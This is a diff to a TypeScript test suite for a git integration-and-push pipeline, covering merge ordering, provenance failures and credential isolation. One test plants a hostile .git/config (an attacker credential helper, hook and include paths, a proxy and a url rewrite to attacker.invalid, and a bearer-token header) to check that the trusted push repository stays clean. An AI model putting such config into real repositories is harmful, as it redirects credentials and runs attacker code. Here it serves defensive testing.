@@ -1,9 +1,11 @@
 import type {IntegrationAdapters, ProvenanceManifest} from './integrate.js'
+import {execFileSync} from 'node:child_process'
 import fs from 'node:fs/promises'
 import os from 'node:os'
 import path from 'node:path'
 import {describe, expect, it} from 'vitest'
-import {readProvenanceManifest, runIntegration, writeProvenanceManifest} from './integrate.js'
+import {makeRealAdapters, readProvenanceManifest, runIntegration, writeProvenanceManifest} from './integrate.js'
+import * as integrateModule from './integrate.js'
 
 // ---------------------------------------------------------------------------
 // Helpers
@@ -18,15 +20,30 @@ function makeAdapters(overrides: Partial<IntegrationAdapters> = {}): Integration
     cloneRepo: async () => {},
     fetchTags: async () => {},
     fetchRef: async () => {},
-    captureRefSha: async () => null,
+    captureRefSha: async () => 'resolved-source-sha',
     createBranch: async () => {},
+    mergeRef: async () => ({kind: 'clean'}),
     runMerge: async () => {},
+    resetToBase: async () => {},
+    stripWorkflowFiles: async () => {},
     commitIntegration: async () => {},
     buildCli: async () => {},
     verifyVersion: async () => {},
     getCommitSha: async () => 'abc1234deadbeef',
+    validateFinalTree: async () => {},
+    prepareTrustedPushRepository: async () => ({
+      workDir: 'trusted-push-repository',
+      integrationCommit: 'abc1234deadbeef',
+      cleanup: async () => {},
+    }),
+    acquirePushCredential: async () => ({token: 'test-token'}),
+    pushIntegration: async () => {},
     ...overrides,
   }
+}
+
+function runGit(workDir: string, args: readonly string[]): string {
+  return execFileSync('git', args, {cwd: workDir, encoding: 'utf8'}).trim()
 }
 
 // ---------------------------------------------------------------------------
@@ -135,8 +152,8 @@ describe('runIntegration', () => {
         'dummy {{tag}} {{branch}} {{merges}} {{sources}} {{repo}} {{version}} {{channel}} {{base}} {{release_repo}} {{release_url}} {{branches}}',
       )
       const adapters = makeAdapters({
-        runMerge: async () => {
-          throw new Error('LLM merge left unresolved conflicts in packages/opencode/src/session/prompt.ts')
+        mergeRef: async () => {
+          throw new Error('deterministic merge left unresolved conflicts in packages/opencode/src/session/prompt.ts')
         },
       })
 
@@ -349,10 +366,10 @@ describe('runIntegration', () => {
   })
 
   // ---------------------------------------------------------------------------
-  // FIX 1: commitIntegration called after runMerge and before getCommitSha
+  // U5: reset, strip, and commit are ordered after deterministic merge
   // ---------------------------------------------------------------------------
 
-  it('fix 1: commitIntegration is called after runMerge and before getCommitSha when sources exist', async () => {
+  it('deterministic merge is followed by reset, workflow strip, commit, and HEAD capture', async () => {
     // #given
     const dir = await makeTmpDir()
     try {
@@ -362,8 +379,15 @@ describe('runIntegration', () => {
       )
       const callOrder: string[] = []
       const adapters = makeAdapters({
-        runMerge: async () => {
-          callOrder.push('runMerge')
+        mergeRef: async () => {
+          callOrder.push('mergeRef')
+          return {kind: 'clean'}
+        },
+        resetToBase: async () => {
+          callOrder.push('resetToBase')
+        },
+        stripWorkflowFiles: async () => {
+          callOrder.push('stripWorkflowFiles')
         },
         commitIntegration: async () => {
           callOrder.push('commitIntegration')
@@ -391,12 +415,17 @@ describe('runIntegration', () => {
 
       // #then
       expect(result.ok).toBe(true)
-      // commitIntegration must come after runMerge and before getCommitSha
-      const mergeIdx = callOrder.indexOf('runMerge')
+      // commitIntegration must come after deterministic merge + strip and before final getCommitSha
+      const mergeIdx = callOrder.indexOf('mergeRef')
+      const resetIdx = callOrder.indexOf('resetToBase')
+      const stripIdx = callOrder.indexOf('stripWorkflowFiles')
       const commitIdx = callOrder.indexOf('commitIntegration')
-      const shaIdx = callOrder.indexOf('getCommitSha')
+      const shaIdx = callOrder.lastIndexOf('getCommitSha')
       expect(mergeIdx).toBeGreaterThanOrEqual(0)
+      expect(resetIdx).toBeGreaterThan(mergeIdx)
+      expect(stripIdx).toBeGreaterThan(resetIdx)
       expect(commitIdx).toBeGreaterThan(mergeIdx)
+      expect(commitIdx).toBeGreaterThan(stripIdx)
       expect(shaIdx).toBeGreaterThan(commitIdx)
     } finally {
       await fs.rm(dir, {recursive: true, force: true})
@@ -617,7 +646,7 @@ describe('runIntegration', () => {
     }
   })
 
-  it('per-ref SHA: captureRefSha failure → falls back to integrationCommit without aborting', async () => {
+  it('per-ref SHA: captureRefSha failure → fails before freezing provenance', async () => {
     // #given
     const dir = await makeTmpDir()
     try {
@@ -647,11 +676,11 @@ describe('runIntegration', () => {
         adapters,
       )
 
-      // #then — run succeeds; ref falls back to integrationCommit
-      expect(result.ok).toBe(true)
-      if (!result.ok) throw new Error(`expected ok, got error: ${result.error}`)
-      expect(result.manifest.integrationRefs.length).toBe(1)
-      expect(result.manifest.integrationRefs[0]?.resolvedSha).toBe(integrationCommit)
+      // #then — an absent resolved source SHA is not publishable provenance
+      expect(result.ok).toBe(false)
+      if (result.ok) throw new Error('expected failure result')
+      expect(result.error).toMatch(/SHA|provenance/i)
+      expect(await readProvenanceManifest(dir)).toBeNull()
     } finally {
       await fs.rm(dir, {recursive: true, force: true})
     }
@@ -722,11 +751,369 @@ describe('clean-snapshot guarantees', () => {
 })
 
 // ---------------------------------------------------------------------------
-// B1: empty-string SHA falls back to integrationCommit
+// U5: code-owned deterministic integration driver
 // ---------------------------------------------------------------------------
 
-describe('per-ref SHA: empty-string and mixed capture fallback', () => {
-  it('captureRefSha returns empty string → falls back to integrationCommit', async () => {
+describe('U5 code-owned integration driver', () => {
+  it('does not let build-checkout git config reach the trusted credentialed push repository', async () => {
+    // #given
+    const sourceDir = await makeTmpDir()
+
+    try {
+      runGit(sourceDir, ['init', '--quiet'])
+      runGit(sourceDir, ['config', 'user.name', 'harness-test'])
+      runGit(sourceDir, ['config', 'user.email', 'harness-test@example.invalid'])
+      await fs.writeFile(path.join(sourceDir, 'README.md'), 'trusted commit\n', 'utf8')
+      runGit(sourceDir, ['add', 'README.md'])
+      runGit(sourceDir, ['commit', '--quiet', '-m', 'integration'])
+      const integrationCommit = runGit(sourceDir, ['rev-parse', 'HEAD'])
+      runGit(sourceDir, ['tag', 'v1.15.13'])
+      const manifest: ProvenanceManifest = {
+        baseVersion: '1.15.13',
+        integrationRefs: [],
+        integrationCommit,
+        buildSha: 'dev',
+      }
+      await writeProvenanceManifest(sourceDir, manifest)
+      const helperMarker = path.join(sourceDir, 'credential-helper-invoked')
+      const helperPath = path.join(sourceDir, 'malicious-credential-helper.sh')
+      await fs.writeFile(helperPath, `#!/bin/sh\nprintf invoked > ${helperMarker}\n`, {encoding: 'utf8', mode: 0o700})
+      await fs.writeFile(
+        path.join(sourceDir, '.git', 'config'),
+        `[core]\n\thooksPath = /tmp/attacker-hooks\n[credential]\n\thelper = !${helperPath}\n[include]\n\tpath = /tmp/attacker-config\n[http]\n\tproxy = http://attacker.invalid\n\textraheader = Authorization: bearer SECRET_TOKEN\n[protocol]\n\tallow = always\n[url "https://attacker.invalid/"]\n\tinsteadOf = https://github.com/\n`,
+        'utf8',
+      )
+
+      const adapters = makeRealAdapters()
+      const trusted = await adapters.prepareTrustedPushRepository(sourceDir, integrationCommit, manifest, {
+        baseTag: 'v1.15.13',
+        integrationCommit,
+        squashed: false,
+        workflowsStripped: false,
+      })
+
+      try {
+        // #then
+        expect(trusted.workDir).not.toBe(sourceDir)
+        expect(await adapters.getCommitSha(trusted.workDir)).toBe(integrationCommit)
+        expect(await readProvenanceManifest(trusted.workDir)).toEqual(manifest)
+        const trustedConfig = await fs.readFile(path.join(trusted.workDir, '.git', 'config'), 'utf8')
+        expect(trustedConfig).not.toContain('attacker')
+        expect(trustedConfig).not.toContain('SECRET_TOKEN')
+        expect(trustedConfig).not.toContain('insteadOf')
+        await expect(
+          adapters.pushIntegration(
+            trusted,
+            integrationCommit,
+            {repository: 'https://127.0.0.1:1/unreachable.git', ref: 'refs/harness-integrate/1.15.13'},
+            {token: 'SECRET_TOKEN'},
+          ),
+        ).rejects.toThrow()
+        await expect(fs.stat(helperMarker)).rejects.toThrow()
+      } finally {
+        await trusted.cleanup()
+        await expect(fs.stat(trusted.workDir)).rejects.toThrow()
+      }
+
+      await expect(fs.stat(sourceDir)).resolves.toBeTruthy()
+    } finally {
+      await fs.rm(sourceDir, {recursive: true, force: true})
+    }
+  })
+
+  it('keeps the public integration API local-only until the command owns artifact completion', async () => {
+    // #given
+    const dir = await makeTmpDir()
+    let credentialsRequested = false
+    let pushCalled = false
+    const adapters = makeAdapters({
+      acquirePushCredential: async () => {
+        credentialsRequested = true
+        return {token: 'test-token'}
+      },
+      pushIntegration: async () => {
+        pushCalled = true
+      },
+    })
+
+    try {
+      // #when
+      const result = await runIntegration(
+        {
+          baseVersion: '1.15.13',
+          releaseRepo: 'anomalyco/opencode',
+          integrationRefs: [],
+          workDir: dir,
+          dryRun: false,
+          pushTarget: {repository: 'https://github.com/fro-bot/agent.git', ref: 'refs/harness-integrate/1.15.13'},
+        },
+        adapters,
+      )
+
+      // #then
+      expect(result.ok).toBe(true)
+      expect(credentialsRequested).toBe(false)
+      expect(pushCalled).toBe(false)
+      expect('finalizeIntegration' in integrateModule).toBe(false)
+    } finally {
+      await fs.rm(dir, {recursive: true, force: true})
+    }
+  })
+
+  it('rejects HEAD drift caused by the build hook before acquiring push credentials', async () => {
+    // #given
+    const dir = await makeTmpDir()
+    let head = 'frozen-integration-commit'
+    let credentialsRequested = false
+    const adapters = makeAdapters({
+      getCommitSha: async () => head,
+      buildCli: async () => {
+        head = 'build-moved-head'
+      },
+      acquirePushCredential: async () => {
+        credentialsRequested = true
+        return {token: 'test-token'}
+      },
+    })
+
+    try {
+      // #when
+      const result = await runIntegration(
+        {
+          baseVersion: '1.15.13',
+          releaseRepo: 'anomalyco/opencode',
+          integrationRefs: [],
+          workDir: dir,
+          dryRun: false,
+          pushTarget: {repository: 'https://github.com/fro-bot/agent.git', ref: 'refs/harness-integrate/1.15.13'},
+        },
+        adapters,
+      )
+
+      // #then
+      expect(result.ok).toBe(false)
+      expect(credentialsRequested).toBe(false)
+      if (result.ok) throw new Error('expected build-time HEAD drift to fail')
+      expect(result.stage).toBe('tree')
+      expect(result.error).toMatch(/drift|frozen|HEAD/i)
+    } finally {
+      await fs.rm(dir, {recursive: true, force: true})
+    }
+  })
+
+  it('merges refs in configured order without invoking the legacy model merge', async () => {
+    // #given
+    const dir = await makeTmpDir()
+    const promptPath = path.join(dir, 'legacy-prompt.txt')
+    await fs.writeFile(promptPath, 'legacy prompt', 'utf8')
+    const events: string[] = []
+    const adapters = {
+      ...makeAdapters({
+        runMerge: async () => {
+          throw new Error('legacy model merge must not run for a clean merge')
+        },
+        fetchRef: async (_workDir: string, _remoteUrl: string, fetchRef: string) => {
+          events.push(`fetch:${fetchRef}`)
+        },
+        buildCli: async () => {
+          events.push('build')
+        },
+        verifyVersion: async () => {
+          events.push('verify')
+        },
+      }),
+      mergeRef: async (_workDir: string, mergeRef: string) => {
+        events.push(`merge:${mergeRef}`)
+        return {kind: 'clean'} as const
+      },
+      resetToBase: async () => {
+        events.push('reset-to-base')
+      },
+      stripWorkflowFiles: async () => {
+        events.push('strip-workflows')
+      },
+      validateFinalTree: async () => {
+        events.push('validate-tree')
+      },
+      acquirePushCredential: async () => {
+        throw new Error('dry-run must not acquire push credentials')
+      },
+      pushIntegration: async () => {
+        throw new Error('dry-run must not push')
+      },
+    }
+
+    try {
+      // #when
+      const result = await runIntegration(
+        {
+          baseVersion: '1.15.13',
+          releaseRepo: 'anomalyco/opencode',
+          integrationRefs: [
+            'https://github.com/anomalyco/opencode/pull/1',
+            'https://github.com/anomalyco/opencode/pull/2',
+          ],
+          agent: 'build',
+          model: 'anthropic/claude-sonnet-5',
+          opencodeBin: 'opencode',
+          workDir: dir,
+          promptPath,
+          dryRun: true,
+        },
+        adapters,
+      )
+
+      // #then
+      expect(result.ok).toBe(true)
+      expect(events.slice(0, 4)).toEqual([
+        'fetch:refs/pull/1/head',
+        'merge:refs/remotes/watch/anomalyco-opencode/pr-1',
+        'fetch:refs/pull/2/head',
+        'merge:refs/remotes/watch/anomalyco-opencode/pr-2',
+      ])
+      expect(events).not.toContain('legacy-model-merge')
+      expect(events.indexOf('strip-workflows')).toBeLessThan(events.indexOf('validate-tree'))
+      expect(events).toContain('build')
+      expect(events).toContain('verify')
+      if (!result.ok) throw new Error('expected successful dry-run')
+      expect(result.dryRun).toBe(true)
+      expect(result.pushed).toBe(false)
+    } finally {
+      await fs.rm(dir, {recursive: true, force: true})
+    }
+  })
+
+  it('returns a typed conflict boundary without attempting to publish', async () => {
+    // #given
+    const dir = await makeTmpDir()
+    const promptPath = path.join(dir, 'legacy-prompt.txt')
+    await fs.writeFile(promptPath, 'legacy prompt', 'utf8')
+    let credentialsRequested = false
+    let pushCalled = false
+    const adapters = {
+      ...makeAdapters({
+        runMerge: async () => {
+          throw new Error('legacy model merge must not run')
+        },
+      }),
+      mergeRef: async () =>
+        ({
+          kind: 'conflict',
+          conflictPaths: ['packages/opencode/src/session/prompt.ts'],
+        }) as const,
+      acquirePushCredential: async () => {
+        credentialsRequested = true
+        return {token: 'test-token'}
+      },
+      pushIntegration: async () => {
+        pushCalled = true
+      },
+    }
+
+    try {
+      // #when
+      const result = await runIntegration(
+        {
+          baseVersion: '1.15.13',
+          releaseRepo: 'anomalyco/opencode',
+          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
+          workDir: dir,
+          promptPath,
+          dryRun: false,
+          pushTarget: {repository: 'https://github.com/fro-bot/agent.git', ref: 'refs/harness-integrate/1.15.13'},
+        },
+        adapters,
+      )
+
+      // #then
+      expect(result.ok).toBe(false)
+      if (result.ok) throw new Error('expected conflict result')
+      if (result.kind !== 'conflict') throw new Error('expected typed conflict result')
+      expect(result.conflict.conflictPaths).toEqual(['packages/opencode/src/session/prompt.ts'])
+      expect(credentialsRequested).toBe(false)
+      expect(pushCalled).toBe(false)
+    } finally {
+      await fs.rm(dir, {recursive: true, force: true})
+    }
+  })
+
+  it('fails closed when an anonymous source fetch requires authentication', async () => {
+    // #given
+    const dir = await makeTmpDir()
+    let mergeCalled = false
+    const adapters = makeAdapters({
+      fetchRef: async () => {
+        throw new Error('authentication required for public source')
+      },
+      mergeRef: async () => {
+        mergeCalled = true
+        return {kind: 'clean'}
+      },
+    })
+
+    try {
+      // #when
+      const result = await runIntegration(
+        {
+          baseVersion: '1.15.13',
+          releaseRepo: 'anomalyco/opencode',
+          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
+          workDir: dir,
+          dryRun: true,
+        },
+        adapters,
+      )
+
+      // #then
+      expect(result.ok).toBe(false)
+      expect(mergeCalled).toBe(false)
+      if (result.ok) throw new Error('expected anonymous fetch failure')
+      expect(result.stage).toBe('fetch')
+      expect(result.error).toMatch(/30182|authentication/i)
+    } finally {
+      await fs.rm(dir, {recursive: true, force: true})
+    }
+  })
+
+  it('fails hard when a fetched source cannot be represented in provenance', async () => {
+    // #given
+    const dir = await makeTmpDir()
+    await fs.writeFile(path.join(dir, 'legacy-prompt.txt'), 'legacy prompt', 'utf8')
+    const adapters = makeAdapters({
+      captureRefSha: async () => null,
+    })
+
+    try {
+      // #when
+      const result = await runIntegration(
+        {
+          baseVersion: '1.15.13',
+          releaseRepo: 'anomalyco/opencode',
+          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
+          workDir: dir,
+          promptPath: path.join(dir, 'legacy-prompt.txt'),
+          dryRun: true,
+        },
+        adapters,
+      )
+
+      // #then
+      expect(result.ok).toBe(false)
+      if (result.ok) throw new Error('expected provenance failure')
+      expect(result.error).toMatch(/provenance|SHA/i)
+      expect(await readProvenanceManifest(dir)).toBeNull()
+    } finally {
+      await fs.rm(dir, {recursive: true, force: true})
+    }
+  })
+})
+
+// ---------------------------------------------------------------------------
+// B1: empty-string SHA fails provenance validation
+// ---------------------------------------------------------------------------
+
+describe('per-ref SHA: empty-string and mixed capture failure', () => {
+  it('captureRefSha returns empty string → fails before freezing provenance', async () => {
     // #given
     const dir = await makeTmpDir()
     try {
@@ -756,21 +1143,21 @@ describe('per-ref SHA: empty-string and mixed capture fallback', () => {
         adapters,
       )
 
-      // #then — run succeeds; empty-string SHA falls back to integrationCommit
-      expect(result.ok).toBe(true)
-      if (!result.ok) throw new Error(`expected ok, got error: ${result.error}`)
-      expect(result.manifest.integrationRefs.length).toBe(1)
-      expect(result.manifest.integrationRefs[0]?.resolvedSha).toBe(integrationCommit)
+      // #then — an empty resolved source SHA is not publishable provenance
+      expect(result.ok).toBe(false)
+      if (result.ok) throw new Error('expected failure result')
+      expect(result.error).toMatch(/SHA|provenance/i)
+      expect(await readProvenanceManifest(dir)).toBeNull()
     } finally {
       await fs.rm(dir, {recursive: true, force: true})
     }
   })
 
   // ---------------------------------------------------------------------------
-  // B2: MIXED per-ref capture (success, null, success)
+  // B2: MIXED per-ref capture (success, null, success) fails provenance validation
   // ---------------------------------------------------------------------------
 
-  it('mixed capture (success, null, success) → correct per-ref fallback', async () => {
+  it('mixed capture (success, null, success) → fails at the missing source SHA', async () => {
     // #given
     const dir = await makeTmpDir()
     try {
@@ -810,13 +1197,11 @@ describe('per-ref SHA: empty-string and mixed capture fallback', () => {
         adapters,
       )
 
-      // #then — refs 0 and 2 use captured SHAs; ref 1 falls back to integrationCommit
-      expect(result.ok).toBe(true)
-      if (!result.ok) throw new Error(`expected ok, got error: ${result.error}`)
-      expect(result.manifest.integrationRefs.length).toBe(3)
-      expect(result.manifest.integrationRefs[0]?.resolvedSha).toBe('sha-for-ref-0')
-      expect(result.manifest.integrationRefs[1]?.resolvedSha).toBe(integrationCommit)
-      expect(result.manifest.integrationRefs[2]?.resolvedSha).toBe('sha-for-ref-2')
+      // #then — a partial source ledger is not publishable provenance
+      expect(result.ok).toBe(false)
+      if (result.ok) throw new Error('expected failure result')
+      expect(result.error).toMatch(/SHA|provenance/i)
+      expect(await readProvenanceManifest(dir)).toBeNull()
     } finally {
       await fs.rm(dir, {recursive: true, force: true})
     }
